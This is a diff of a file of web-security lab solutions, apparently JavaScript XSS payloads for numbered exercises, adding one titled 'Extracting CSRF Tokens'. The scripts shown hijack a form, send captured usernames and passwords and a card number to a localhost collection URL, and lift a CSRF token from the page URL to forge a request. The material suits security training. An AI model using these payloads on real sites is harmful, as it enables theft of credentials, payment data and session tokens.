@@ -145,7 +145,6 @@ window.setTimeout(function()
 {
 	document.forms[0].action = 'http://localhost';
 	document.forms[0].submit();
-
 },10000);
 	
 </script>
@@ -164,7 +163,6 @@ window.setTimeout(function()
 	var req = new XMLHttpRequest();
 	req.open("GET", "http://localhost/?username="+username+"&password="+password, true);
 	req.send();
-
 },10000);
 	
 </script>
@@ -179,7 +177,7 @@ req.onreadystatechange = function ()
 
 {
 	if (req.readyState == 4 && req.status == 200)
-	
+		
 	{
 		document.getElementById("result").innerHTML = req.responseText;
 	}
@@ -199,19 +197,37 @@ var req = new XMLHttpRequest();
 req.onreadystatechange = function ()
 
 {
-
-	if (req.readyState == 4 && req.status ==200)
-	
+	if (req.readyState == 4 && req.status ==200)	
 {
 	alert(req.responseText);
 	new Image().src = "http://localhost/?cardno="+req.responseText;
-	
 }
-
 };
 
 req.open("POST", "/lab/webapp/jfp/15/cardstore", true);
 req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 req.send("user=john");
+	
+</script>
+
+
+* Solution 16: Extracting CSRF Tokens
+
+<script>
+
+var req = new XMLHttpRequest();
+req.onreadystatechange = function ()
+
+{
+	if (req.readyState == 4 && req.status ==200)
+{
+	document.getElementById("result").innerHTML=req.responseText;
+}
+};
+
+var token = window.location.search.split('&')[1];
+
+req.open("GET", "/lab/webapp/jfp/16/email?name=john&"+token, true);
+req.send();
 	
 </script>
